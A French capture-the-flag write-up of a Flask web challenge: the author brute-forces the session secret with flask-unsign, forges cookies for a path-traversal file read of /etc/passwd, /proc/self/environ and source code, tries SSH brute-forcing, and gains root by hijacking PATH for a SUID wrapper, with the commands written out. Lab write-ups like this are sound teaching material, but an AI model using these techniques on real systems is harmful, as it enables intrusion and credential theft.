On lance le web, on apprend qu'il y a un port ssh en plus du port web.

On arrive sur le site avec une partie devis et news. On ouvre le code source, rien d'inattendu.
Le serveur derrière est du Werkzeug/2.0.2 Python/3.8.10.
On lance un dirb en back. (qui ne donnera rien)

On lance burpsuite et on commence par envoyer un form sur la page de devis, bon on a un METHOD NOT ALLOWED ?
On ouvre news et on a un texte simplement.
Quelque chose cloche, l'affichage n'est pas ultra smooth, j'entends par là que lorsqu'on actualise on a une sorte de cache ou je ne sais quoi.
Ce n'est pas si logique et franc que pour un site en PHP classique ou autre. Je mets donc un GET sur news dans burp.
Il y a un set cookie, alors qu'on a déjà un PHPSESSID, bizarre !! 
"Set-Cookie: session=.eJyrVspJLC6Jz0stL44vqShRskLw9UB8HaWi1JTMotRkkBRIVKkWAPF_EqU.Yb3WYw.Jxijdb3LqGbu4kOAbCNcrwAxITg;"
On dirait un cookie flask, j'utilise flask unsign avec la valeur mise dans cookie.txt

> cat cookie.txt | flask-unsign -d --cookie
{'last_news_txt': 'last_news.txt', 'redirect': 'news'}

Ok ça sent la LFI à plein nez tout ça, on va tenter d'unsign le cookie (en gros flask-unsign va bruteforce le secret), et on pourra forger nos cookies ensuite.

> cat cookie.txt | flask-unsign -u --cookie > out                                                                     
[*] Session decodes to: {'last_news_txt': 'last_news.txt', 'redirect': 'news'}                                          
[*] No wordlist selected, falling back to default wordlist..                                                            
[*] Starting brute-forcer with 8 threads..                                                                              
[+] Found secret key after 15616 attempts......-a8HRH
'your-personal-access-token'

Niquel on va pouvoir forger notre propre cookie déjà pour voir:
> flask-unsign -s --secret "your-personal-access-token" --cookie "{'last_news_txt': 'last_news.txt', 'redirect': 'news'}"    
.eJxTqlbPSSwuic9LLS-OL6koUbdSQAjogQR0FNSLUlMyi1KTwZIgcfVaJQA7IRNx.Yb3fYQ.BUmqaDhAbxVwM1coKiLFfet82OI

Shit erreur 500, j'essaye avec le parametre legacy pour les anciennes versions, pareil.
Je fais un script rapidement en python avec flask unsign, pareil mais au moins j'irai plus vite.
Ca ne peut être qu'un problème de version ? J'ai la secret key, il n'y a pas de raison.

J'ai trouvé un script en dorkant sur github, je l'ai testé maintenant je peux passer ma LFI via mon cookie.
Je leak /etc/passwd et je vois l'utilisateur webmasta. Je vais chercher une clé SSH ou autre un bash history.

Je leak ../../../../../proc/self/environ
HOSTNAME=1afc4dbb71d6
TERM=xterm
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
TZ=Europe/Moscow
MAIL=/var/mail/webmasta
LOGNAME=webmasta
USER=webmasta
HOME=/home/webmasta
SHELL=/bin/sh
SUDO_COMMAND=/usr/bin/python3 server.py
SUDO_USER=root
SUDO_UID=0
SUDO_GID=0

Ok je cherchais a leak server.py et pas app.py, je le trouve avec ../server.py !
On apprend qu'il existe un devis.html
Il a une fonction idk:
def idk():         
	with open('lol.xd', 'wb+') as f:
		f.write('idkidk')

Bah du coup moi non plus je vois pas son utilité ...
A part la lfi du coup je vois pas d'autre vuln. La fonction idk est même pas routée, quel troll ce jéjé :'( 
En leakant /etc/issue on sait qu'on a du Ubuntu 20.04.3 LTS derrière.


../../../../../../var/log/auth.log
Dommage rsyslog, pas de logs de ssh attempts pour la ssti, je cherche du logs http, on a rien vu que ça tourne avec flask, logique.
Je cherche du logs par exemple de File not found, comme ça on pourra mettre un nom de fichier bidon et proc une SSTI, rien non plus.

Je lance un bruteforce sur le SSH avec rockyou, on verra ce que ça donne. (Rien)
Je modifie mon script pour run une liste de fichiers (directory traversal sur linux), je leak pas grand chose de plus ...
Je commence à mongoliser, je vois pas où attaquer, pour moi y'a pas d'autres vulns, est-ce que rsyslog mettrait pas les logs ssh dans secure ?

Le chall était pété, il fallait faire effectivement une SSTI sur auth.log en fournissant un nom d'utilisateur assez court.
Jéjé me donne directement le password pour se co en SSH et continuer.

Let's go, premier réflexe, vous l'aurez compris, linpeas ! 
Je lis et je vois rapidement des fichiers bizarres dans /home/root.
Je me balade un peu et je comprends qu'un script read_news.sh lit les fichiers contenus dans son parent. 
Mon but va être simple, lui faire lire le flag, il n'a pas de SUID, par contre je vois que Wrapper en a un, je le lance !
sh: 1: read_news.sh: not found
J'essaye quelques tricks pour essayer de lui faire lire read_news, échec.
Je télécharge le fichier wrapper en me connectant en SFTP avec filezilla, je l'ouvre avec IDA pour comprendre pourquoi j'ai cette erreur, son code est très simple:
int __cdecl main(int argc, const char **argv, const char **envp)
{
  setuid(0);
  system("read_news.sh");
  return 0;
}

Bon je suis un peu matrixé, vu qu'il lance en tant que root, il prendrait /home/root comme working directory ?
J'ai pas les droits d'écritures là bas ..
Je tente le tricks de modifier la variable d'environnement PATH et mettre /tmp avec un faux script python qui lance un shell.
Ca fonctionne !

webmasta@f51ea1149084:/home/root/my_news/news_reader$ cd /tmp
webmasta@f51ea1149084:/tmp$ echo "/bin/sh" > read_news.sh
webmasta@f51ea1149084:/tmp$ chmod +x read_news.sh
webmasta@f51ea1149084:/tmp$ export PATH=/tmp:$PATH
webmasta@f51ea1149084:/tmp$ cd /home/root/my_news/news_reader
webmasta@f51ea1149084:/home/root/my_news/news_reader$ ./wrapper
# cat /home/root/flag.txt
ESNA{JH1s7aceBz20EoL4WqPYR9Ni65JvgtxF}